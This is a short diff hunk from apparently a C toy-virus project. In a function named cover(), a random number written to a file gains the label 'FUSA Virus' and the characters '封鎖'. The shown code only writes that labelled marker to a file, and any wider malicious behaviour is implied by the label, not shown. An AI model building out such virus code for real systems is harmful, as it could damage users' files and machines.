@@ -39,7 +39,7 @@ int cover(void){
 
    fptr = fopen(name,"w");
 
-   fprintf(fptr,"%d", rand());
+   fprintf(fptr,"FUSA Virus -- %d -- 封鎖", rand());
    fclose(fptr);
 
    return 0;
